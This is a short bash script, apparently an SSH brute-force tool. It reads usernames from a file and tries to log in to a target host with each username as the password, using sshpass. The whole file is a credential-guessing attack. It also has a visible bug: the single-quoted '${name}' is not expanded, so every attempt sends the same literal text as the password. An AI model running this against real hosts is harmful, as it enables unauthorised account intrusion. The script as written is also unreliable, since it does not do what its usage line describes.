#!/bin/bash
# Usage - ./sshbrute.sh users.txt hostname
cat $1 | while read name
do
	echo "Trying ${name}@$2"
	sshpass -p '${name}' ssh ${name}@$2
done